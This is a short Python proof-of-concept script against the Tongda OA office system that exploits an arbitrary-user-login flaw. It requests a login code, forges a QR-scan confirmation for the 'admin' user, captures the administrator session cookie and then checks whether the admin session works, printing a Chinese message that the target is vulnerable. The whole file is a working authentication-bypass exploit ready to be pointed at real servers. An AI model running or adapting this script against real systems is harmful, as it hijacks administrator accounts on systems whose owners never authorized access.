import httpx
import json
from lib.get_normal_url import get_standard_url

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
def get_uid(target):
    try:
        target = get_standard_url(target)
        url = target + '/ispirit/login_code.php'
        req = httpx.get(url, headers=headers)
        resText = json.loads(req.text)
        codeUid = resText['codeuid']
        return codeUid
    except:
        pass

def get_cookie(target):
    try:
        target = get_standard_url(target)
        url = target + '/general/login_code_scan.php'
        codeUid = get_uid(target)
        req1 = httpx.post(url, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
        resText = json.loads(req1.text)
        status = resText['status']
        new_headers = {}
        if status == str(1):
            getCodeUidUrl = target+'/ispirit/login_code_check.php?codeuid='+codeUid
            res = httpx.get(getCodeUidUrl)
            admin_cookie = res.headers['Set-Cookie']
            new_headers["Cookie"] = admin_cookie
        return new_headers
    except:
        pass

def poc(target):
    try:
        target = get_standard_url(target)
        new_headers = get_cookie(target)
        vuln_available = httpx.get(target + '/general/index.php',headers=new_headers)
        if 'cur_login_user_id="admin"' in vuln_available.text:
            print("\033[0;31m ispirit/login_code.php存在通达任意用户登录漏洞："+target)
    except:
        pass